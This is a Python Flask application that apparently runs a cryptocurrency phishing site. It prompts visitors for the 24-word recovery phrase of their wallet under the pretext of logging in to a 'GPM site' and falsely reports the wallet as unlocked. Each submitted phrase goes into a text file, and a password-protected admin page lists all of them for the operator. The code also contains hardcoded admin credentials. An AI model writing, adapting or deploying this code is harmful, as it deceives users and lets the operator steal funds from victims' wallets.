from flask import Flask, render_template, request, Response
from functools import wraps

app = Flask(__name__)

# --------------------------
# Authentication for /admin
# --------------------------
def check_auth(username, password):
    return username == 'kheed67' and password == 'Teenie67*'  # change as needed

def authenticate():
    return Response(
        'Access denied. Please log in.', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'})

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# --------------------------
# Routes
# --------------------------

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/passphrase')
def passphrase():
    return render_template('passphrase.html')

@app.route('/submit-passphrase', methods=['POST'])
def submit_passphrase():
    phrase = request.form.get('passphrase', '').strip()
    words = phrase.split()
    if len(words) != 24:
        return render_template('passphrase.html', error="Invalid passphrase, please enter exactly 24 words of your wallet to login to GPM site")

    with open('passphrases.txt', 'a') as file:
        file.write(phrase + '\n')
    return "Wallet unlocked. Redirecting to GPM site..."

@app.route('/admin')
@requires_auth
def admin():
    with open('passphrases.txt', 'r') as file:
        passphrases = file.readlines()
    return '<br>'.join(passphrases)

# --------------------------
# Run the App
# --------------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5054)
